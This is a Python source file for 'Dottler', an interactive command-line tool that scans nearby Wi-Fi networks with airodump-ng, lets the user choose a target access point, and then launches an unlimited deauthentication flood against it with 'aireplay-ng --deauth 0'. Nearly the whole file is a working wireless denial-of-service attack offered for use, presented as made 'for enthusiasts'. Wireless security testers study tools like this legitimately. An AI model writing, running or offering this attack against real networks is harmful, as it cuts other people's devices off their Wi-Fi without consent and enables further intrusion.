# Dottler by Yzee4
#
# MIT License
#
# Copyright (c) 2023 Yzee4
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import os
import subprocess
import csv
import shutil
import socket
import sys
import threading
import random
import time

def colors():
    global white, cyan, lightred, lightgreen, yellow, lightblue, pink
    white = '\033[0;97m'
    cyan = '\033[0;36m'
    lightred = '\033[0;91m'
    lightgreen = '\033[0;92m'
    yellow = '\033[0;93m'
    lightblue = '\033[0;94m'
    pink = '\033[0;95m'
colors()

def verify_root():
    if os.geteuid() == 0:
        return True
    else:
        print(f"{lightred}[-] {white}Execute as root!")
        sys.exit()
verify_root()

def check_tool_installed(tool_name):
    if tool_name == 'net-tools':
        return os.path.exists('/sbin/ifconfig')
    else:
        return shutil.which(tool_name) is not None

def check_network_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        pass
    return False
if check_network_connection():
    subprocess.run("clear")
    print(f"{lightred}[-] {white}Please start Dottler without {yellow}being connected to a internet{white}.")
    sys.exit()
else:
    exit_script = False

def check_internet():
    while not exit_script:
        try:
            subprocess.run(["ping", "-c", "1", "google.com"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError:
            pass 
        else:
            subprocess.run("clear")
            print(f"{lightred}[-] {white}{yellow}Do not activate the internet {white}while using Dottler.") 
            os._exit(0)
        time.sleep(0.1) 
internet_thread = threading.Thread(target=check_internet)
internet_thread.start()

def initializing_dottler():
    subprocess.call('clear')
    tools_to_check = ['aircrack-ng', 'net-tools']
    not_installed_tools = []
    for tool in tools_to_check:
        if not check_tool_installed(tool):
            not_installed_tools.append(tool)
    if not_installed_tools:
        for tool in not_installed_tools:
            print(f"{lightred}[-] {yellow}{tool} {white}not installed. To install, use {lightgreen}'sudo apt install {tool}'{white}.")
            sys.exit()
initializing_dottler()

def temp_folder():
    global tempfolder
    tempfolder = '/usr/local/bin/'
    os.chdir(tempfolder)
    for archive in os.listdir(tempfolder):
        if archive == "dottler-01.csv":
            archive_path = os.path.join(tempfolder, archive)
            os.remove(archive_path)
temp_folder()

def global_variables():
    global nadpt, essid, channel, bssid
    global set_essid, set_nadpt
    global tempfolder
    nadpt = None
    essid = None
    channel = None
    bssid = None

    set_nadpt = 'false'
    set_essid = 'false'
global_variables()

def temp_folder():
    global tempfolder
    tempfolder = '/usr/local/bin/'
    os.chdir(tempfolder)
    for archive in os.listdir(tempfolder):
        if archive == "dottler-01.csv":
            archive_path = os.path.join(tempfolder, archive)
            os.remove(archive_path)
    
def cmd_set_nadpt():
    global nadpt
    global set_nadpt
    def network_cards():
        try:
            result = subprocess.check_output(["iw", "dev"])
            result_str = result.decode("utf-8")
            cards = []
            lines = result_str.split("\n")
            for line in lines:
                if "Interface" in line:
                    card_name = line.replace("Interface", "").strip()
                    cards.append(card_name)
            return cards
        except subprocess.CalledProcessError:
            print(f"{lightred}[-] {white}'iw dev' not executed.")
            print('')
    network_cards()

    def scan_nadpt():
        global scan_nadpt_process
        global cards
        cards = network_cards()
        if not cards:
            print(f"{lightred}[-] {white}No network adapters available.")
            print('')
            return None
        for card in cards:
            print(f"{lightgreen}[+] {white}Availables network adapters:")
            print(f"{lightgreen}NADPT: {white}{card}")
            print('')
            scan_nadpt_process = 'true'
    scan_nadpt()
    try:
        while True:
            nadpti = input(f"{lightblue}[#] {white}Set NADPT > ")
            if nadpti in cards:
                nadpt = nadpti
                set_nadpt = 'true'
                print(f"{lightgreen}[+] {white}NADPT set to {lightgreen}'{nadpt}'{white}.")
                print('')
                main()
                break
            else:
                print(f"{lightred}[-] {yellow}'{nadpti}' {white}Does not match a valid nadpt.")
                print('')
    except KeyboardInterrupt:
        print('')
        print('')
        main()

def cmd_set_essid_part1():
    if set_nadpt == 'true':
        try:
            def set_scanning_time():
                global scanning_time
                try:
                    while True:
                        iscanning_time = input(f"{lightblue}[#] {white}Set scanning time (in seconds) > ")
                        if iscanning_time.isdigit():
                            scanning_time = float(iscanning_time)
                            print('')
                            break
                        else:
                            print(f"{lightred}[-] {white}Enter a number!")
                            print('')
                except KeyboardInterrupt:
                    print('')
                    print('')
                    main()
            set_scanning_time()

            def cmd_set_essid_part2():
                global essid
                global bssid
                global channel
                global scanning_time
                global set_essid
                process = subprocess.Popen(f"airodump-ng -w {tempfolder}/dottler --write-interval 1 --output-format csv {nadpt}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                print(f"{yellow}[/] {white}Scanning... please wait for {lightgreen}'{scanning_time}' {white}seconds.")
                time.sleep(scanning_time)
                process.terminate()
                process.wait()
                network_data = []
                networks = []
                try:
                    with open(f"{tempfolder}/dottler-01.csv") as arquivo_csv:
                        writer_csv = csv.reader(arquivo_csv)
                        for line in writer_csv:
                            if len(line) >= 15 and line[0].strip() != 'BSSID':
                                view_bssid = line[0].strip()
                                view_essid = line[13].strip()
                                view_channel = line[3].strip()
                                if view_essid:
                                    network_data.append((view_bssid, view_essid, view_channel))
                                    networks.append(view_essid)
                                    temp_folder()
                except FileNotFoundError:
                    print(f"{lightred}[-] {white}File not found.")
                    print('')
                    main()
                if network_data:
                    print('')
                    print(f"{lightgreen}[+] {white}Available networks:")
                    for view_bssid, view_essid, view_channel in network_data:
                        print(f"{lightgreen}ESSID: {white}{view_essid}")
                    print('')
                else:
                    print(f"{lightred}[-] {white}Networks not found.")
                    print('')
                    main()

                while True:
                    try:
                        iessid = input(f"{lightblue}[#] {white}Set ESSID > ")
                        if iessid in networks:
                            for chosen_bssid, chosen_essid, chosen_channel in network_data:
                                if chosen_essid == iessid:
                                    essid = chosen_essid
                                    channel = chosen_channel
                                    bssid = chosen_bssid
                                    print(f"{lightgreen}[+] {white}ESSID set to {lightgreen}'{essid}'{white}.")
                                    print(f"{lightgreen}[+] {white}CHANNEL set to {lightgreen}'{channel}'{white}.")
                                    print(f"{lightgreen}[+] {white}BSSID set to {lightgreen}'{bssid}'{white}.")
                                    print('')
                                    set_essid = 'true'
                            break
                        else:
                            print(f"{lightred}[-] {yellow}'{iessid}' {white}Does not match a valid ESSID.")
                            print('')
                    except KeyboardInterrupt:
                        print('')
                        print('')
                        main()
            cmd_set_essid_part2()

        except KeyboardInterrupt:
            print('')
            print('')
            main()
    else:
        print(f"{lightred}[-] {white}Nadpt has not set. Use {lightgreen}'set nadpt'")
        print ('')

def cmd_start():
    def cmd_start_process():
        if set_essid == 'true':
            global nadpt
            global essid
            global channel
            global bssid
            print('')
            print(f"{yellow}[/] {white}Please wait a moment.")
            try:
                print('')
                print(f"{lightgreen}[+] {white}Starting attack on {lightgreen}'{essid}' {white}channel {lightgreen}'{channel}'{white}...")
                airodump_process = subprocess.Popen(f"airodump-ng --bssid {bssid} --channel {channel} {nadpt} > /dev/null 2>&1", shell=True)
                time.sleep(1)
                os.kill(airodump_process.pid, 2)
                print(f"{pink}[>] {white}Attack started. Press {lightgreen}'Ctrl+C' {white}to stop.")
                subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} {nadpt} > /dev/null 2>&1", shell=True)
                print(f"{lightred}[-] {white}Unknown error{white}.")
                os._exit(1)

            except KeyboardInterrupt:
                print('')
                print(f"{lightgreen}[+] {white}Attack interrupted! Please wait a moment.")
                print('')
                main()
        else:
            print(f"{lightred}[-] {white}Essid has not set. Use {lightgreen}'set essid'")
            print ('')
    cmd_start_process()
cmd_start()

def cmd_options():
    print(f"""{yellow}[/] {white}Dottler options:

NADPT: {lightgreen}{nadpt}{white}

ESSID: {lightgreen}{essid}{white}\tCHANNEL: {lightgreen}{channel}{white}\tBSSID: {lightgreen}{bssid}{white}

{yellow}[/] {white}To set NADPT, use {lightgreen}'set nadpt'{white}, to set ESSID, use {lightgreen}'set essid'{white}.
""")
    
def interface_variables():
    global color  
    global dottler 

    def choose_color_randomly():
        color_codes = {
        'yellow': '\033[0;93m',
        'lightblue': '\033[0;94m',
        'lightred': '\033[0;91m',
        'cyan': '\033[0;96m',
        'pink': '\033[0;95m',
        }

        dottler_values = {
        'yellow': '\033[7;3;93m',
        'lightblue': '\033[7;3;94m',
        'lightred': '\033[7;3;91m',
        'cyan': '\033[7;3;96m',
        'pink': '\033[7;3;95m',
        }
        randomcolor_name = random.choice(list(color_codes.keys()))
        color = color_codes[randomcolor_name]
        dottler = dottler_values.get(randomcolor_name, 'unknown')
        return color, dottler
    color, dottler = choose_color_randomly()

    def interface_arguments():
        global head
        global randominterface
        global interface

        head = (f"""{white}Produced for enthusiasts :)""")
        interfaces_codes = {
        "Interface 1":"""
██████╗  ██████╗ ████████╗████████╗██╗     ███████╗██████╗     
██╔══██╗██╔═══██╗╚══██╔══╝╚══██╔══╝██║     ██╔════╝██╔══██╗
██║  ██║██║   ██║   ██║      ██║   ██║     █████╗  ██████╔╝
██║  ██║██║   ██║   ██║      ██║   ██║     ██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝   ██║      ██║   ███████╗███████╗██║  ██║
╚═════╝  ╚═════╝    ╚═╝      ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝""",}
                                            
        interfaces = list(interfaces_codes.keys())
        randominterface_name = random.choice(interfaces)
        randominterface = interfaces_codes[randominterface_name]

        interface = (f"""{white}Make sure you are using the latest version at {lightgreen}'https://github/com/yzee4/Dottler'{white}.  
                                                  
{color}   <\> {white}Coded by Yzee4
{color}   <\> {white}Produced on Python

{lightgreen}* {white}When running Dottler yout network card may {yellow}disable {white}the internet connection.
  If this happens, simply {lightgreen}restart your machine{white}.

{white}To see options, use {lightgreen}'options'{white}.
        """)
    interface_arguments()
interface_variables()

def show_interface():
    reset_color = '\033[0m'
    subprocess.call('clear')
    print(f'''{color}{head}{color}{randominterface}\n{interface}{reset_color}''')
show_interface()

def main():
    try:
        while True:
            dconsole = input(f"{dottler}dottler{white} > ").strip()

            if dconsole == "set nadpt":
                cmd_set_nadpt()

            elif dconsole == "set essid":
                cmd_set_essid_part1()
            
            elif dconsole == "start":
                cmd_start()

            elif dconsole == "options":
                cmd_options()

            elif dconsole == "clear":
                subprocess.run("clear")
                show_interface()
                main()

            else:
                print(f"{lightred}[-] {white}Unknown command: {dconsole}.")
                print('')

    except KeyboardInterrupt:
        print('')
        print(f'{yellow}[/] {white}Thank for using! :)')
        os._exit(0)
main()


